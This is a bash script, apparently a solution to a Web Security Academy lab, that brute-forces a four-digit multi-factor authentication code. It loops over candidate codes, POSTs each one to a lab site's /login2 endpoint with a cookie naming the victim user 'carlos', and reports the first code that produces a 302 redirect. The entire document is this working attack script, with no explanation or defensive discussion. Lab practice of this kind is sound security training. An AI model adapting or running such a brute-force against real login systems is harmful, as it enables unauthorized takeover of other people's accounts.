for w in {0..9}; do

    for x in {9..9}; do

        for y in {0..9}; do

            for z in {0..9}; do
                num="$w$x$y$z"
                curl -i -s -k -X $'POST' \
                    -H $'Host: ac321ff01e998509c0ec328c00d50058.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://ac321ff01e998509c0ec328c00d50058.web-security-academy.net/login2' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 13' -H $'Origin: https://ac321ff01e998509c0ec328c00d50058.web-security-academy.net' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
                    -b $'verify=carlos' \
                    --data-binary "mfa-code=$num" \
                    $'https://ac321ff01e998509c0ec328c00d50058.web-security-academy.net/login2' | grep 302 >/dev/null 2>&1

                if [ $? -eq 0 ]; then
                    echo "[+] Found MFA code: $num"
                    exit 0
                fi
            done
        done
    done
done
